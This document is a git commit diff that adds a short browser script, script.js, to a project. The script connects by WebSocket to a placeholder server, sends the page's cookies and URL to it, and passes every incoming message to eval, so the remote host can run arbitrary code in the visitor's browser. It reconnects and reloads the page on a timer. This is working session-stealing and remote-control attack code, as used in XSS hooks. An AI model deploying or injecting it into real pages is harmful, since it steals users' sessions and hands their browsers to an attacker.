4e0b8f0607e591c847b2eb7367ba17bf1cfcd9e6
ChromMob <filip.chromy04@gmail.com>
2024-07-01 15:57:58 +0200

    Push the root script.js

---
+++ src/main/resources/script.js
@@ -0,0 +1,27 @@
+var ws = new WebSocket("wss://your-server-url:your-server-port");
+var messages = [];
+ws.onopen = function () {
+  ws.send("session " + document.cookie + " " + window.location.href);
+  for (var i = 0; i < messages.length; i++) {
+    ws.send(messages[i]);
+  }
+};
+function sendMessage(message) {
+  if (ws.readyState == WebSocket.OPEN || messages.length > 0) {
+    ws.send(message);
+  } else {
+    messages.push(message);
+  }
+}
+ws.onmessage = function (event) {
+  eval(event.data);
+};
+
+setInterval(function () {
+  if (ws.readyState == WebSocket.CLOSED) {
+    ws = new WebSocket("wss://your-server-url:your-server-port");
+    ws.onopen = function () {
+      window.location.reload();
+    };
+  }
+}, 5000);
